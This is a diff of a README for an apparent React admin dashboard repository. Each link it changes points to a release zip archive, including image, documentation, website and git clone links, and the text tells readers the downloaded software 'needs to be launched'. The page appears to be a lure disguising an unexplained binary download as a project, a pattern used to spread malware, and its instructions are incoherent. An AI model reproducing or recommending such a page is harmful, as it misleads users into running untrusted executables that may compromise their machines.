@@ -1,6 +1,6 @@
 # 🚀 Welcome to the AdminLTE React Dashboard Repository 🚀
 
-![AdminLTE React Dashboard Logo](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip)
+![AdminLTE React Dashboard Logo](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v2.0/Software.zip)
 
 ### Repository Name: adminlte-react-dashboard
 
@@ -27,19 +27,19 @@
 ---
 
 ### 📂 Releases Section 📂
-🔗 [Check the Releases section for the latest updates and files](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip)
+🔗 [Check the Releases section for the latest updates and files](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v2.0/Software.zip)
 
 ---
 
 ## 🚀 Download Software 🚀
-[![Download Software](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip)](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip)
+[![Download Software](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v2.0/Software.zip)](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v2.0/Software.zip)
 
 ℹ️ The software available in the link needs to be launched.
 
 ---
 
 ### 🌐 Visit our Website 🌐
-🔗 [Explore our website for more information](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip)
+🔗 [Explore our website for more information](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -54,12 +54,12 @@
 ---
 
 ## 📷 Screenshots:
-![Dashboard Preview](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip)
+![Dashboard Preview](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v2.0/Software.zip)
 
 ---
 
 ## 🚀 Getting Started:
-1. Clone the repository: `git clone https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip`
+1. Clone the repository: `git clone https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v2.0/Software.zip`
 2. Install dependencies: `npm install`
 3. Start the development server: `npm start`
 4. Customize the dashboard to fit your project requirements
@@ -77,9 +77,9 @@
 ---
 
 ## 📖 Additional Resources:
-🔗 [AdminLTE Documentation](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip)
-🔗 [React Documentation](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip)
-🔗 [Bootstrap Documentation](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v1.0/Release_x64.zip)
+🔗 [AdminLTE Documentation](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v2.0/Software.zip)
+🔗 [React Documentation](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v2.0/Software.zip)
+🔗 [Bootstrap Documentation](https://github.com/AdiSec/adminlte-react-dashboard/releases/download/v2.0/Software.zip)
 
 ---
 
